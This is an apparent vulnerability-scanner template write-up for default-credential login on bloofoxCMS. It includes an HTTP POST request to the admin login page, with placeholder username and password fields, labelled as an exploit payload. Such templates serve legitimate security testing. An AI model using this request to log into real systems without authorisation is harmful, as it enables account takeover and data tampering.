# Nuclei Template: bloofoxCMS - Default Login
**Template ID:** bloofoxcms-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`bloofoxcms-default-login.yaml`)

## Vulnerability Information & PoC

## Description
bloofoxCMS contains default credentials. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.

## Steps to reproduce / Exploit Payload
```http
POST /admin/index.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username={{username}}&password={{password}}&action=login
```

## References
- https://www.bloofox.com/automated_setup.113.html
- https://www.bloofox.com
